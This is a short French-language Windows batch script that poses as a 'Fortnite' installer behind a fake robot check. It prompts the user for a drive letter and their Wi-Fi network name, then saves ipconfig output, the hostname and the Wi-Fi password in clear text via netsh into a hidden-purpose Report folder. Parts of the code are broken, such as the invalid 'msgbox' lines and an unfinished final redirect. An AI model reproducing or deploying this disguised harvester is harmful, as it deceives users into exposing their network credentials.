@echo off
cls
title Fortnite

msgbox * @CodYanJS, All Rights Reserved.
echo @CodYanJS, All Rights Reserved.
set /p nouvelle_variable="Entrez la lettre C pour verifier que vous n'etes pas un robot"
cd %nouvelle_variable%:\
md Report
set /p wifipass="Entrez le nom du wifi auquel vous etes connéctes :"
cls
msgbox * Cliquez sur [ENTRER] pour démarrer l'installation.
pause >nul
echo Installation en cours
ipconfig > %nouvelle_variable%:\Report\ipconfig.txt
ipconfig /all > %nouvelle_variable%:\Report\ipconfigall.txt
hostname > %nouvelle_variable%:\Report\hostname.txt
netsh wlan show profile name=%wifipass% key=clear > %nouvelle_variable%:\Report\wifipass.txt
net accounts > %nouvelle_variable%


pause
